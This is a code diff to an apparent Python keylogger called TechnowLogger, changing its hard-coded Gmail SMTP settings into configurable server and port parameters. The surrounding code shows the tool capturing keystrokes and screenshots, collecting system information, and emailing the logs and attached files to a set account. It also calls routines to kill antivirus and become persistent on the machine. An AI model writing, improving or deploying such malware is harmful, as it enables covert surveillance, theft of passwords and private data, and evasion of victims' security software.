@@ -25,11 +25,13 @@ except Exception:
     pass
 
 class Keylogger:
-    def __init__(self, time_interval, email, password):
+    def __init__(self, time_interval, email, password, smtp_server, smtp_port):
         self.log = ""
         self.interval = time_interval
         self.email = email
         self.password = password
+        self.smtp_server = smtp_server
+        self.smtp_port = smtp_port
         self.temp_screenshot = tempfile.gettempdir() + "\\screenshot.png"
         self.system_info = self.get_system_info()
         self.lastWindow = ""   #Used to Distinguish Log Data 
@@ -193,7 +195,7 @@ class Keylogger:
     def send_mail(self, message):
         try:
             message = "Subject: TechnowLogger Reporting\n\n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + message
-            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
             server.starttls()
             server.login(self.email, self.password)
             server.sendmail(self.email, self.email, message)
@@ -219,7 +221,7 @@ class Keylogger:
                         'content-disposition', 'attachment', filename=basename(f) )
                 msg.attach(attachedfile)
 
-            smtp = smtplib.SMTP(host="smtp.gmail.com", port= 587) 
+            smtp = smtplib.SMTP(host=self.smtp_server, port= self.smtp_port) 
             smtp.starttls()
             smtp.login(self.email, self.password)
             smtp.sendmail(self.email, self.email, msg.as_string())
@@ -288,7 +290,7 @@ if __name__ == '__main__':
     if time_persistent == "":
         time_persistent = 10
     
-    test = Keylogger(interval, email, password)
+    test = Keylogger(interval, email, password, "smtp.gmail.com", 587)
     test.kill_av()        
     test.become_persistent(time_persistent)
     test.start()
